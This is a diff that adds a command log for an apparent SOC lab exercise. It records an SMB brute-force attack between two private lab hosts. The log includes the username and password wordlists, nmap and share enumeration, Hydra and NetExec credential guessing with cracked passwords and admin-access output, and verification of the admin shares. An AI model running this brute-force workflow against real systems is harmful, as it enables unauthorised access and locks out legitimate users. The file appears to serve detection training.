@@ -1,0 +1,43 @@
+# Kali commands — SOC-Case-Brute-Force (192.168.100.106 -> 192.168.100.108)
+# Actual commands run. Attack window: 2026-10-26 23:50 ~ 2026-10-27 00:00 UTC+8.
+
+# Wordlists
+cat > users.txt <<'EOF'
+jdoe
+mreyes
+adminlab
+administrator
+guest
+EOF
+cat > pass.txt <<'EOF'
+123456
+password
+Password1
+P@ssw0rd
+qwerty
+letmein
+rockyou
+Winter2024!
+EOF
+
+# Recon
+nmap -sS -sV -p 139,445,5985,3389 192.168.100.108
+
+# Enumeration
+netexec smb 192.168.100.108 -u '' -p '' --shares
+smbclient -L //192.168.100.108 -U guest%
+
+# Hydra (FAILED — SMBv1 disabled on target; documented finding)
+hydra -L users.txt -P pass.txt smb://192.168.100.108 -t 4 -vV
+
+# NetExec brute force (SUCCESS)
+netexec smb 192.168.100.108 -u users.txt -p pass.txt --continue-on-success
+#   [+] jdoe:Password1
+#   [+] adminlab:P@ssw0rd (Pwn3d!)
+#   mreyes -> STATUS_ACCOUNT_LOCKED_OUT after 5 failures
+
+# Verify admin access
+smbclient -L //192.168.100.108 -U adminlab%P@ssw0rd
+#   ADMIN$, C$, IPC$ enumerated
+
+date   # record time for timeline
